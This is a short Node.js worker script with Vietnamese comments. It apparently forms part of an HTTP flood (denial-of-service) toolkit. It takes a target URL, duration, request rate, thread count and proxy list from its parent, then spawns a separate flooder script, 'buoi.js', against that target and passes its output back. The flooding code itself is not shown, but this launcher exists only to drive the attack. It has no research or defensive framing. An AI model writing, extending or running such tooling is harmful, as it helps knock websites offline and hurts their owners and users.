const { parentPort, workerData } = require('worker_threads');
const { spawn } = require('child_process');

// Nhận dữ liệu từ workerData
const { url, time, rate, thea, proxy } = workerData;
const mode = 'skibidi';
// Hàm chạy flooder.js
function runFlooder() {
    const flooder = spawn('node', ['buoi.js', url, time, rate, thea, proxy, mode]);

    flooder.stdout.on('data', (data) => {
        parentPort.postMessage(`Output: ${data}`);
    });

    flooder.stderr.on('data', (data) => {
        parentPort.postMessage(`Error: ${data}`);
    });

    flooder.on('close', (code) => {
        if (code === 0) {
            parentPort.postMessage('Flooder successfully.');
            process.exit(0);
        } else {
            parentPort.postMessage(`Flooder Success ${code}`);
            process.exit(1);
        }
    });
}

// Chạy flooder
runFlooder();
